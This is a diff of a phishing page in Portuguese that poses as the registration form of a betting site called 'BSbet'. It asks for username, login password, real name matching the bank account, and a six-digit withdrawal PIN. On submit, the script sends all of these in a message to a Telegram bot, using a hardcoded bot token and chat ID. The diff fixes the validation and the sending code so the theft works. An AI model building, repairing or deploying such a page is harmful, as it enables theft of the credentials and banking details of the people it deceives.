@@ -6,15 +6,15 @@
     <title>BSbet Oficial</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --y: #f3c350; --bg: rgba(26,26,26,0.9); --in: #2a2a2a; --txt: #888; --err: #ff4d4d; }
+        :root { --y: #f3c350; --bg: rgba(26,26,26,0.95); --in: #2a2a2a; --txt: #888; --err: #ff4d4d; }
         body { 
             margin: 0; padding: 0; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            background-color: #0d0d0d;
             background-image: url('https://static.vecteezy.com/system/resources/previews/001/955/352/original/abstract-black-and-grey-hexagon-background-free-vector.jpg');
-            background-size: cover; background-position: center; background-attachment: fixed;
+            background-size: cover; background-attachment: fixed;
         }
-        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: -1; }
-        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 20px; border-radius: 20px; box-shadow: 0 15px 35px #000; backdrop-filter: blur(5px); }
-        .logo { text-align: center; font-size: 32px; font-weight: bold; font-style: italic; margin-bottom: 20px; }
+        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; }
+        .logo { text-align: center; font-size: 32px; font-weight: bold; font-style: italic; margin-bottom: 20px; color: white; }
         .logo span { color: var(--y); }
         .tabs { display: flex; border-bottom: 1px solid #333; margin-bottom: 20px; }
         .tab { padding: 10px; color: var(--txt); cursor: pointer; width: 50%; text-align: center; font-weight: bold; }
@@ -22,11 +22,10 @@
         .box { background: var(--in); border: 1px solid #444; border-radius: 10px; display: flex; align-items: center; padding: 12px; margin-bottom: 12px; }
         .box i { color: var(--txt); width: 25px; text-align: center; margin-right: 10px; }
         .box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 16px; }
-        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 10px; opacity: 0.5; }
+        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 10px; cursor: pointer; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .hint { color: var(--y); font-size: 11px; margin: -5px 0 15px 5px; }
         .error { border-color: var(--err) !important; }
-        .tela { display: none; }
-        .ativa { display: block; }
     </style>
 </head>
 <body>
@@ -34,66 +33,74 @@
 <div class="card">
     <div class="logo">BS<span>bet</span></div>
     <div class="tabs">
-        <div id="t-reg" class="tab active" onclick="show('reg')">Registro</div>
-        <div id="t-log" class="tab" onclick="show('log')">Login</div>
+        <div class="tab active">Registro</div>
+        <div class="tab">Login</div>
     </div>
 
-    <div id="view-reg" class="tela ativa">
-        <form id="f-reg">
-            <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="u" placeholder="Usuário / E-mail" required></div>
-            <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="p1" placeholder="Senha login" required></div>
-            <div class="box"><i class="fa-solid fa-check"></i><input type="password" id="p2" placeholder="Repetir senha login" required></div>
-            <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="n" placeholder="Nome Real" required></div>
-            <p class="hint">Igual ao nome do banco</p>
-            <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="s1" placeholder="Senha saque (6 dígitos)" maxlength="6" required></div>
-            <div class="box"><i class="fa-solid fa-circle-check"></i><input type="password" id="s2" placeholder="Confirmar saque" required></div>
-            <button type="submit" id="btn-r" class="btn" disabled>REGISTRAR</button>
-        </form>
-    </div>
-
-    <div id="view-log" class="tela">
-        <form id="f-log">
-            <div class="box"><i class="fa-solid fa-user"></i><input type="text" placeholder="Celular / Conta" required></div>
-            <div class="box"><i class="fa-solid fa-lock"></i><input type="password" placeholder="Senha" required></div>
-            <button type="submit" class="btn" style="opacity: 1;">ENTRAR</button>
-        </form>
-    </div>
+    <form id="f-reg">
+        <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="u" placeholder="Usuário / E-mail" required></div>
+        <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="p1" placeholder="Senha login" required></div>
+        <div class="box"><i class="fa-solid fa-check"></i><input type="password" id="p2" placeholder="Confirmar senha login" required></div>
+        <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="n" placeholder="Nome Real" required></div>
+        <p class="hint">Igual ao nome do banco</p>
+        <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="s1" placeholder="Senha saque (6 dígitos)" maxlength="6" required></div>
+        <div class="box"><i class="fa-solid fa-circle-check"></i><input type="password" id="s2" placeholder="Confirmar saque" required></div>
+        
+        <button type="submit" id="btn-r" class="btn">REGISTRAR</button>
+    </form>
 </div>
 
 <script>
-    // --- CONFIGURAÇÃO DO TELEGRAM ---
-    const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; // Coloque o token do BotFather aqui
-    const CHAT_ID = "4996441181"; // Coloque o seu Chat ID aqui
+    // --- IMPORTANTE: COLOQUE SEUS DADOS AQUI ---
+    const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
+    const CHAT_ID = "4996441181";
 
-    function show(t) {
-        document.getElementById('view-reg').classList.toggle('ativa', t === 'reg');
-        document.getElementById('view-log').classList.toggle('ativa', t === 'log');
-        document.getElementById('t-reg').classList.toggle('active', t === 'reg');
-        document.getElementById('t-log').classList.toggle('active', t === 'log');
-    }
+    const form = document.getElementById('f-reg');
+    const btn = document.getElementById('btn-r');
 
-    const i = { p1: document.getElementById('r-p1'), p2: document.getElementById('r-p2'), s1: document.getElementById('r-s1'), s2: document.getElementById('r-s2'), b: document.getElementById('btn-r') };
-
-    function validar() {
-        const v1 = (p1.value === p2.value && p1.value !== "");
-        const v2 = (s1.value === s2.value && s1.value.length === 6);
-        p2.parentElement.classList.toggle('error', p1.value !== p2.value && p2.value !== "");
-        s2.parentElement.classList.toggle('error', s1.value !== s2.value && s2.value !== "");
-        
-        if(v1 && v2) { btnR.disabled = false; btnR.style.opacity = "1"; }
-        else { btnR.disabled = true; btnR.style.opacity = "0.5"; }
-    }
-
-    [p1, p2, s1, s2].forEach(el => el.addEventListener('input', validar));
-
-    // ENVIO PARA O TELEGRAM
-    document.getElementById('f-reg').onsubmit = function(e) {
+    form.onsubmit = function(e) {
         e.preventDefault();
-        const msg = `🔔 *NOVO CADASTRO* 🔔\n\n👤 Usuário: ${document.getElementById('u').value}\n🔑 Senha: ${p1.value}\n💳 Nome: ${document.getElementById('n').value}\n💰 Saque: ${s1.value}`;
-        
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-        .then(() => { alert("Cadastro realizado!"); location.reload(); })
-        .catch(() => alert("Erro ao enviar!"));
+
+        // Validação rápida antes de enviar
+        const p1 = document.getElementById('p1').value;
+        const p2 = document.getElementById('p2').value;
+        const s1 = document.getElementById('s1').value;
+        const s2 = document.getElementById('s2').value;
+
+        if (p1 !== p2) { alert("As senhas de login não conferem!"); return; }
+        if (s1 !== s2) { alert("As senhas de saque não conferem!"); return; }
+        if (s1.length < 6) { alert("A senha de saque deve ter 6 dígitos!"); return; }
+
+        btn.disabled = true;
+        btn.innerText = "ENVIANDO...";
+
+        const msg = `🔔 *NOVO CADASTRO* 🔔\n\n👤 Usuário: ${document.getElementById('u').value}\n🔑 Senha: ${p1}\n💳 Nome: ${document.getElementById('n').value}\n💰 Saque: ${s1}`;
+
+        // Usando HTTPS obrigatoriamente
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(res => {
+            if (res.ok) {
+                alert("✅ Cadastro realizado com sucesso!");
+                location.reload();
+            } else {
+                alert("❌ Erro no Bot. Verifique o Token e o Chat ID.");
+                btn.disabled = false;
+                btn.innerText = "REGISTRAR";
+            }
+        })
+        .catch(err => {
+            alert("❌ Erro de conexão.");
+            btn.disabled = false;
+            btn.innerText = "REGISTRAR";
+        });
     };
 </script>
 
